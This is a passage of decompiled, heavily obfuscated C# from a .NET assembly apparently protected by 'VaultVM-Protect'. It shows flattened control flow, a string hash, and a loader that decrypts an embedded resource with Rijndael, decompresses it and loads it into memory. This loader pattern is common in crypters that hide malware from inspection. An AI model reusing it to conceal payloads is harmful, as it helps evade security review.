                  switch ((num5 = (uint) (-(-num4 ^ -(~(-1458912947 * 652018229) ^ ~(1540449869 + 187335364))) * 32813813)) % 3U)
                  {
                    case 0:
                      goto label_13;
                    case 1:
                      ProjectData.ClearProjectError();
                      num4 = (int) num5 * -975847185 ^ -436256031;
                      continue;
                    default:
                      goto label_18;
                  }
                }
              }
            }
label_18:
            checked { index += -1; }
            goto case 2;
        }
      }
label_15:;
    }

    internal static uint ComputeStringHash(string s)
    {
      uint stringHash = 2166136261;
label_1:
      int num1 = -798657205;
      int index;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (((num1 ^ -((-(-1402508684 ^ 1402843203) ^ 1593976927 * -953931695) + ((1658763524 ^ -737680620) * 720161459 + (-2073500205 * -667042017 - (1050590026 ^ 770072021))))) - (--694114757 * 148823141 + ~1246606437 + (1583219296 - -1373049482 + --531601226 ^ -1100189821 * (-132208381 - -1410361051))) - -353565539 * (844485837 * (1900873776 - -134497799)) - 2053470167 + ~1360680019) * -1313344249)) % 8U)
        {
          case 0:
            num1 = (int) num2 * 967628869 ^ -2136034508;
            continue;
          case 1:
            index = 0;
            num1 = (int) num2 * -470666011 ^ 386510690;
            continue;
          case 2:
            stringHash = (uint) (((int) s[index] ^ (int) stringHash) * 16777619);
            num1 = -1932671695;
            continue;
          case 3:
            int num3;
            num1 = num3 = index < s.Length ? -1698661507 : (num3 = 151075298);
            continue;
          case 4:
            int num4 = s == null ? -443159270 : (num4 = -1335201554);
            num1 = num4 ^ (int) num2 * -842617194;
            continue;
          case 6:
            ++index;
            num1 = (int) num2 * 2079946286 ^ -1462128040;
            continue;
          case 7:
            goto label_1;
          default:
            goto label_9;
        }
      }
label_9:
      return stringHash;
    }

    private static void VaultVM\u002DProtect\u002D8F2EEGH61H()
    {
      StringBuilder stringBuilder = new StringBuilder();
      foreach (byte num in Encoding.Unicode.GetBytes(Encoding.BigEndianUnicode.GetString(SHA1.Create().ComputeHash(BitConverter.GetBytes(-1936476542)))))
        stringBuilder.Append(num.ToString("                 "));
      Stream manifestResourceStream = typeof (\u003CModule\u003E).Assembly.GetManifestResourceStream(stringBuilder.ToString().Substring(0, 8));
      byte[] buffer1 = new byte[manifestResourceStream.Length];
      manifestResourceStream.Read(buffer1, 0, buffer1.Length);
      Rijndael rijndael = Rijndael.Create();
      rijndael.Key = SHA256.Create().ComputeHash(BitConverter.GetBytes(-793778237));
      rijndael.IV = new byte[16];
      rijndael.Mode = CipherMode.CBC;
      MemoryStream memoryStream1 = new MemoryStream();
      CryptoStream cryptoStream = new CryptoStream((Stream) memoryStream1, rijndael.CreateDecryptor(), CryptoStreamMode.Write);
      cryptoStream.Write(buffer1, 0, buffer1.Length);
      cryptoStream.FlushFinalBlock();
      byte[] array = memoryStream1.ToArray();
      memoryStream1.Close();
      cryptoStream.Close();
      MemoryStream memoryStream2 = new MemoryStream();
      using (GZipStream gzipStream = new GZipStream((Stream) new MemoryStream(array), CompressionMode.Decompress))
      {
        int count1 = 1024;
        byte[] buffer2 = new byte[count1];
        for (int count2 = gzipStream.Read(buffer2, 0, count1); count2 > 0; count2 = gzipStream.Read(buffer2, 0, count1))
          memoryStream2.Write(buffer2, 0, count2);
      }
      \u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D.VaultVM\u002DProtect\u002DAHEA38FC74 = Assembly.Load(memoryStream2.ToArray());
      AppDomain.CurrentDomain.AssemblyResolve += (ResolveEventHandler) ((obj0, obj1) => \u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D.VaultVM\u002DProtect\u002DAHEA38FC74.FullName == obj1.Name ? \u007B1f3161f6\u002D9f56\u002D4783\u002D8038\u002D41d0bfd456a9\u007D.VaultVM\u002DProtect\u002DAHEA38FC74 : (Assembly) null);
    }
  }
}
